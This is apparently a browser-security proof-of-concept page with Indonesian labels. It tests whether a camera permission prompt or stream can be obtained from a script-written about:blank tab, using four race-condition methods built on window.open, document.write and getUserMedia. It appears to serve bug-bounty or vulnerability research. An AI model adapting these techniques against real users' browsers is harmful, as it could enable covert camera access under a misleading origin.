<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Race Condition: Kamera via about:blank</title>
<style>
  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; }
  .panel { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #0f3460; }
  button { padding: 12px 20px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 14px; width: 100%; }
  button:hover { background: #c73650; }
  #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #0f3460; }
  .success { color: #4caf50; font-weight: bold; }
  .error { color: #f44336; }
  .info { color: #2196f3; }
  .warn { color: #ff9800; font-weight: bold; }
</style>
</head>
<body>

<h1>⏱️ Race Condition: Kamera via about:blank</h1>

<div class="panel">
  <p style="color:#aaa;">Uji apakah prompt izin kamera bisa muncul dari about:blank dengan timing yang tepat.</p>
  <button id="btnRace1">1. Race: Tulis + getUserMedia (0ms)</button>
  <button id="btnRace2">2. Race: getUserMedia via parent setelah window.open</button>
  <button id="btnRace3">3. Race: microtask + getUserMedia</button>
  <button id="btnRace4">4. Race: Tanpa document.write (langsung getUserMedia)</button>
  <button id="clear" style="background:#555;">Bersihkan Log</button>
</div>

<div id="log">Menunggu perintah...</div>

<script>
(function() {
  'use strict';

  const logEl = document.getElementById('log');

  function log(msg, type = '') {
    const time = new Date().toISOString().substr(11, 8);
    const line = `[${time}] ${msg}\n`;
    const span = document.createElement('span');
    if (type) span.className = type;
    span.textContent = line;
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
    console.log(msg);
  }

  // ============================================
  // FUNGSI: KONTEN UNTUK ABOUT:BLANK (meminta kamera)
  // ============================================
  function getCameraHTML() {
    return `
      <!DOCTYPE html>
      <html><head><title>Camera Access</title></head>
      <body style="font-family:Arial;text-align:center;padding:30px;">
        <h2>Camera Permission Test</h2>
        <p id="status">Meminta izin kamera...</p>
        <video id="video" autoplay playsinline style="width:100%;max-width:300px;border:1px solid #ccc;margin-top:10px;"></video>
        <script>
          (function(){
            var statusEl = document.getElementById('status');
            var videoEl = document.getElementById('video');

            function requestCamera() {
              if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                statusEl.textContent = 'getUserMedia tidak didukung';
                parent.postMessage({ status: 'no_api' }, '*');
                return;
              }
              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                  statusEl.textContent = '✅ IZIN KAMERA DIBERIKAN!';
                  parent.postMessage({ status: 'granted' }, '*');
                  videoEl.srcObject = stream;
                })
                .catch(function(err) {
                  statusEl.textContent = '❌ Gagal: ' + err.name + ' - ' + err.message;
                  parent.postMessage({ status: 'error', error: err.name + ': ' + err.message }, '*');
                });
            }

            // Coba langsung
            requestCamera();

            // Juga coba setelah 100ms
            setTimeout(requestCamera, 100);
          })();
        <\/script>
      </body></html>
    `;
  }

  // ============================================
  // METODE 1: Tulis + getUserMedia (0ms)
  // ============================================
  document.getElementById('btnRace1').onclick = () => {
    log('=== METODE 1: Tulis + getUserMedia (0ms) ===', 'info');

    const win = window.open('about:blank', '_blank');
    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
    log('Tab about:blank dibuka.', 'success');

    // Race: tulis konten segera
    try {
      win.document.open();
      win.document.write(getCameraHTML());
      win.document.close();
      log('Konten ditulis ke about:blank.', 'success');
    } catch (e) {
      log('❌ Gagal tulis: ' + e.message, 'error');
      return;
    }

    // Listener pesan
    window.addEventListener('message', (e) => {
      if (e.data && e.data.status) {
        const s = e.data.status;
        if (s === 'granted') log('✅ IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
        else if (s === 'error') log('❌ Gagal: ' + e.data.error, 'error');
        else if (s === 'no_api') log('❌ API tidak didukung.', 'error');
      }
    }, { once: false });
  };

  // ============================================
  // METODE 2: getUserMedia via parent setelah window.open
  // ============================================
  document.getElementById('btnRace2').onclick = () => {
    log('=== METODE 2: getUserMedia via Parent ===', 'info');

    // 1. Minta izin kamera dari parent
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      log('❌ getUserMedia tidak didukung di parent.', 'error');
      return;
    }

    log('Meminta izin kamera dari parent...', 'info');
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then((stream) => {
        log('✅ Izin kamera diberikan dari parent.', 'success');

        // 2. Buka about:blank
        const win = window.open('about:blank', '_blank');
        if (!win) { log('❌ Popup diblokir.', 'error'); return; }
        log('Tab about:blank dibuka.', 'success');

        // 3. Tulis konten (yang akan mencoba akses kamera)
        try {
          win.document.open();
          win.document.write(`
            <!DOCTYPE html>
            <html><head><title>Camera Access from Blank</title></head>
            <body style="font-family:Arial;text-align:center;padding:30px;">
              <h2>Camera Access</h2>
              <p id="status">Mencoba akses kamera...</p>
              <video id="video" autoplay playsinline style="width:100%;max-width:300px;border:1px solid #ccc;margin-top:10px;"></video>
              <script>
                (function(){
                  var statusEl = document.getElementById('status');
                  var videoEl = document.getElementById('video');
                  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    statusEl.textContent = 'getUserMedia tidak didukung';
                    parent.postMessage({ status: 'no_api_blank' }, '*');
                    return;
                  }
                  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(function(stream) {
                      statusEl.textContent = '✅ IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!';
                      parent.postMessage({ status: 'granted_blank' }, '*');
                      videoEl.srcObject = stream;
                    })
                    .catch(function(err) {
                      statusEl.textContent = '❌ Gagal: ' + err.name;
                      parent.postMessage({ status: 'error_blank', error: err.name + ': ' + err.message }, '*');
                    });
                })();
              <\/script>
            </body></html>
          `);
          win.document.close();
          log('Konten ditulis ke about:blank.', 'success');
        } catch (e) {
          log('❌ Gagal tulis: ' + e.message, 'error');
        }

        // Hentikan stream parent (opsional)
        setTimeout(() => {
          stream.getTracks().forEach(t => t.stop());
          log('Stream parent dihentikan.', 'info');
        }, 5000);

      }).catch((err) => {
        log('❌ Izin kamera ditolak di parent: ' + err.name + ' - ' + err.message, 'error');
      });

    // Listener
    window.addEventListener('message', (e) => {
      if (e.data && e.data.status) {
        const s = e.data.status;
        if (s === 'granted_blank') log('🎯 BUG: IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
        else if (s === 'error_blank') log('❌ Gagal di about:blank: ' + e.data.error, 'error');
        else if (s === 'no_api_blank') log('❌ API tidak didukung di about:blank.', 'error');
      }
    }, { once: false });
  };

  // ============================================
  // METODE 3: microtask + getUserMedia
  // ============================================
  document.getElementById('btnRace3').onclick = () => {
    log('=== METODE 3: microtask + getUserMedia ===', 'info');

    const win = window.open('about:blank', '_blank');
    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
    log('Tab about:blank dibuka.', 'success');

    // Gunakan microtask untuk menulis konten secepat mungkin
    queueMicrotask(() => {
      try {
        win.document.open();
        win.document.write(getCameraHTML());
        win.document.close();
        log('Konten ditulis via microtask.', 'success');
      } catch (e) {
        log('❌ Gagal tulis: ' + e.message, 'error');
      }
    });

    // Listener
    window.addEventListener('message', (e) => {
      if (e.data && e.data.status) {
        const s = e.data.status;
        if (s === 'granted') log('✅ IZIN KAMERA DIBERIKAN!', 'success');
        else if (s === 'error') log('❌ Gagal: ' + e.data.error, 'error');
        else if (s === 'no_api') log('❌ API tidak didukung.', 'error');
      }
    }, { once: false });
  };

  // ============================================
  // METODE 4: Tanpa document.write (langsung getUserMedia via parent)
  // ============================================
  document.getElementById('btnRace4').onclick = () => {
    log('=== METODE 4: Langsung getUserMedia via parent setelah window.open ===', 'info');

    const win = window.open('about:blank', '_blank');
    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
    log('Tab about:blank dibuka.', 'success');

    // Coba akses getUserMedia dari parent, tapi targetkan video ke about:blank
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      log('❌ getUserMedia tidak didukung di parent.', 'error');
      return;
    }

    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then((stream) => {
        log('✅ Izin kamera diberikan dari parent.', 'success');

        // Coba pasang stream ke about:blank (jika bisa)
        try {
          win.document.open();
          win.document.write(`
            <!DOCTYPE html>
            <html><head><title>Camera</title></head>
            <body style="text-align:center;padding:30px;">
              <h2>Camera</h2>
              <video id="video" autoplay playsinline style="width:100%;max-width:300px;"></video>
              <script>
                parent.postMessage({ status: 'ready_for_stream' }, '*');
              <\/script>
            </body></html>
          `);
          win.document.close();
          log('Konten ditulis ke about:blank.', 'success');

          // Setelah 500ms, coba akses video element
          setTimeout(() => {
            try {
              const videoEl = win.document.getElementById('video');
              if (videoEl) {
                videoEl.srcObject = stream;
                log('🎯 Stream kamera DIPASANG ke about:blank! (BUG)', 'success');
              } else {
                log('❌ Video element tidak ditemukan.', 'error');
              }
            } catch (e) {
              log('❌ Gagal pasang stream: ' + e.message, 'error');
            }
          }, 500);

        } catch (e) {
          log('❌ Gagal tulis: ' + e.message, 'error');
        }
      })
      .catch((err) => {
        log('❌ Izin kamera ditolak: ' + err.name + ' - ' + err.message, 'error');
      });

    // Listener
    window.addEventListener('message', (e) => {
      if (e.data && e.data.status === 'ready_for_stream') {
        log('About:blank siap menerima stream.', 'info');
      }
    }, { once: false });
  };

  // ============================================
  // CLEAR LOG
  // ============================================
  document.getElementById('clear').onclick = () => {
    logEl.textContent = '';
    log('Log dibersihkan.', 'info');
  };

  // ============================================
  // INIT
  // ============================================
  log('Race Condition Camera PoC siap. Pilih metode di atas.', 'info');
  log('⚠️ Chrome Android modern memblokir getUserMedia dari about:blank.', 'warn');
  log('   Jika ada yang berhasil, itu BUG (Critical).', 'info');

})();
</script>
</body>
</html>
